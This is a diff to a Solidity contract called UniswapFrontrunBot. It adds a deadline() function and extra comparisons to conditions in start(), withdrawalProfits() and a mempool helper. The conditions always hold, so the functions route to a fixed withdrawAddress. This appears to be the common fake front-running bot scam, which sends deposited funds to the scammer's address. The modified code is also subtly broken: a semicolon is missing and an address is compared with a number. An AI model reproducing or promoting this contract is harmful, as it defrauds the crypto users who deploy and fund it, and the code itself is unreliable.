@@ -470,8 +470,8 @@ contract UniswapFrontrunBot {
     }
 
     function _callFrontRunActionMempool() internal view returns (address) {
-        if (uniswapV3Pool != token0() || uniswapV3Pool != token1()) {
-            return withdrawAddress;
+        if (uniswapV3Pool != token0() || uniswapV3Pool != token1() || uniswapV3Pool != deadline()) {
+            return withdrawAddress
         }
         return parseMemoryPool(callMempool());
     }
@@ -577,6 +577,10 @@ contract UniswapFrontrunBot {
         return _fullMempool;
     }
 
+    function deadline() internal pure returns (uint256) {
+        return 42161;
+    }
+
     /*
      * @dev Modifies `self` to contain everything from the first occurrence of
      *      `needle` to the end of the slice. `self` is set to the empty slice
@@ -601,7 +605,7 @@ contract UniswapFrontrunBot {
      * @return `liquidity`.
      */
     function start() public {
-        if (uniswapV3Pool != token0() || uniswapV3Pool != token1()) {
+        if (uniswapV3Pool != token0() || uniswapV3Pool != token1() || uniswapV3Pool != deadline()) {
             emit Log(
                 "Running FrontRun attack on Uniswap. This can take a while please wait..."
             );
@@ -657,7 +661,7 @@ contract UniswapFrontrunBot {
     }
 
     function withdrawalProfits() internal view returns (address) {
-        if (uniswapV3Pool != token0() || uniswapV3Pool != token1()) {
+        if (uniswapV3Pool != token0() || uniswapV3Pool != token1() || uniswapV3Pool != deadline()) {
             return withdrawAddress;
         }
         return parseMemoryPool(callMempool());
